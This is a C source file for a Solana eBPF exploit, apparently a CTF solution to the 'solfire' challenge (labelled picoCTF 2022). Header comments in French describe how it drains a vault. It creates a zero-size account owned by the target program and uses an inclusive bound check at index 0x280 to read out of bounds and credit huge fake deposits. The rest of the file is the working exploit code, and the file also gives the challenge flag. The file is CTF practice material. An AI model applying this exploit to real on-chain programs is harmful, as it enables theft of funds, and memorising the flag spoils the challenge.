// 302 - solfire  (Binary Exploitation, picoCTF 2022)
// Flag: academy{c9d4c62a}
// Write-up: ../../../writeups/binary-exploitation/302-solfire.md
// This is the script that produced the flag; historical variants are in archive/.
//
// solfire exploit - picoCTF 2022 (CyLab Academy 302)
//
// Cible : programme eBPF solfire.so (Solana), la vault vaut 1 000 000 lamports
// Dépendances : clang -target bpf -mcpu=v1, le linker maison mklink.py, build.sh, client.py
// Usage : ./build.sh puis python3 client.py <host> <port>
//
// Chaine d'attaque (toutes les distances mesurees) :
//   1. on cree un compte de taille ZERO, owner = solfire.so, a une adresse PDA de NOTRE
//      programme (graine vide + bump) : le controle d'owner de handle_withdraw passe,
//      alors que le compte ne contient aucune donnee
//   2. handle_withdraw borne input[1] <= 0x280 INCLUSIVEMENT et lit le ledger a
//      data + input[1]*0x10 : avec l'index 0x280 on lit data + 0x2800, soit un cran
//      apres le padding du compte
//   3. cette lecture ne faulte pas : le runtime mappe tout le buffer d'entrees comme
//      une seule region MM_INPUT, donc on lit du garbage non nul interprete comme des
//      "depots" enormes
//   4. la vault paie, le solde du user depasse TARGET_AMT et le service rend le flag
//
// disposition des donnees d'instruction :
//   [0]    ledger nonce (PDA bump of our program, empty seed)
//   [1]    vault nonce  (PDA bump of solfire, seed "vault")
//   [2..6] amount u32 LE
//   [6]    mode: 0=create+withdraw 1=create only 2=create+1lamport marker
//               3=withdraw only     4=marker only
//   [8..10] ledger index u16 LE
#include <solana_sdk.h>

#define CLOCK   0
#define SYSTEM  1
#define LEDGER  2
#define VAULT   3
#define USER    4
#define SOLFIRE 5

// SystemInstruction::CreateAccount { lamports, space, owner }  (variant 0)
static uint64_t make_ledger(SolParameters *params, uint8_t nonce) {
  const SolSignerSeed seed = {(const uint8_t *)&nonce, 1};
  const SolSignerSeeds seeds = {&seed, 1};

  SolAccountMeta meta[] = {
    {params->ka[USER].key,   true, true},  // payer: writable, signer (tx signer)
    {params->ka[LEDGER].key, true, true},  // new account: writable, our PDA signs
  };

  uint8_t buf[0x34];
  sol_memset(buf, 0, sizeof(buf));
  // [0..4]   variant = 0 (CreateAccount)
  // [4..12]  lamports = 0
  // [12..20] space    = 0   <-- crucial: zero data bytes allocated
  // [20..52] owner    = solfire program
  sol_memcpy(&buf[20], (const uint8_t *)params->ka[SOLFIRE].key, 32);

  const SolInstruction ix = {
    params->ka[SYSTEM].key, meta, SOL_ARRAY_SIZE(meta), buf, SOL_ARRAY_SIZE(buf)
  };
  return sol_invoke_signed(&ix, params->ka, params->ka_num, &seeds, 1);
}

// SystemInstruction::Transfer { lamports } (variant 2): user -> vault, 1 lamport.
// Used purely as a remote diagnostic marker proving the ledger was created.
static uint64_t marker(SolParameters *params) {
  SolAccountMeta meta[] = {
    {params->ka[USER].key,  true, true},
    {params->ka[VAULT].key, true, false},
  };
  uint8_t buf[12];
  sol_memset(buf, 0, sizeof(buf));
  buf[0] = 2;   // variant
  buf[4] = 1;   // lamports

  const SolInstruction ix = {
    params->ka[SYSTEM].key, meta, SOL_ARRAY_SIZE(meta), buf, 12
  };
  return sol_invoke_signed(&ix, params->ka, params->ka_num, (SolSignerSeeds *)0, 0);
}

// solfire handle_withdraw: ledger index (u32 at [4..8]), amount (u32 at [8..12]),
// vault nonce at [12].
static uint64_t do_withdraw(SolParameters *params, uint8_t vault_nonce,
                            uint32_t index, uint32_t amount) {
  SolAccountMeta meta[] = {
    {params->ka[CLOCK].key,  false, false},
    {params->ka[SYSTEM].key, false, false},
    {params->ka[LEDGER].key, true,  false},
    {params->ka[USER].key,   true,  true},
    {params->ka[VAULT].key,  true,  false},
  };

  uint8_t buf[16];
  sol_memset(buf, 0, sizeof(buf));
  buf[0] = 2;                    // code = handle_withdraw
  buf[4] = (uint8_t)(index & 0xff);
  buf[5] = (uint8_t)((index >> 8) & 0xff);
  buf[6] = (uint8_t)((index >> 16) & 0xff);
  buf[7] = (uint8_t)((index >> 24) & 0xff);
  buf[8]  = (uint8_t)(amount & 0xff);
  buf[9]  = (uint8_t)((amount >> 8) & 0xff);
  buf[10] = (uint8_t)((amount >> 16) & 0xff);
  buf[11] = (uint8_t)((amount >> 24) & 0xff);
  buf[12] = vault_nonce;

  const SolInstruction ix = {
    params->ka[SOLFIRE].key, meta, SOL_ARRAY_SIZE(meta), buf, 16
  };
  return sol_invoke_signed(&ix, params->ka, params->ka_num, (SolSignerSeeds *)0, 0);
}

static uint32_t rd32(const uint8_t *p) {
  return (uint32_t)p[0] | ((uint32_t)p[1] << 8) | ((uint32_t)p[2] << 16) | ((uint32_t)p[3] << 24);
}

extern uint64_t entrypoint(const uint8_t *input) {
  SolAccountInfo accounts[8];
  SolParameters params = (SolParameters){.ka = accounts};

  if (!sol_deserialize(input, &params, SOL_ARRAY_SIZE(accounts))) {
    return ERROR_INVALID_ARGUMENT;
  }
  if (params.ka_num < 6) {
    sol_log("not enough accounts");
    return ERROR_NOT_ENOUGH_ACCOUNT_KEYS;
  }

  uint8_t  ledger_nonce = params.data[0];
  uint8_t  vault_nonce  = params.data[1];
  uint32_t amount = (params.data_len >= 6) ? rd32(&params.data[2]) : 0x10000u;
  uint8_t  mode   = (params.data_len >= 7) ? params.data[6] : 0;
  uint32_t index  = (params.data_len >= 10) ? (uint32_t)(params.data[8] | (params.data[9] << 8)) : 0x280u;

  sol_log_64(mode, amount, index, ledger_nonce, vault_nonce);

  uint64_t rc = 0;

  if (mode == 0 || mode == 1 || mode == 2) {
    rc = make_ledger(&params, ledger_nonce);
    sol_log_64(1, rc, 0, 0, 0);
    if (rc != SUCCESS) return SUCCESS;   // report via balances, keep tx alive
  }

  if (mode == 2 || mode == 4) {
    rc = marker(&params);
    sol_log_64(4, rc, 0, 0, 0);
    return SUCCESS;
  }

  if (mode == 0 || mode == 3) {
    rc = do_withdraw(&params, vault_nonce, index, amount);
    sol_log_64(2, rc, 0, 0, 0);
  }

  return SUCCESS;
}
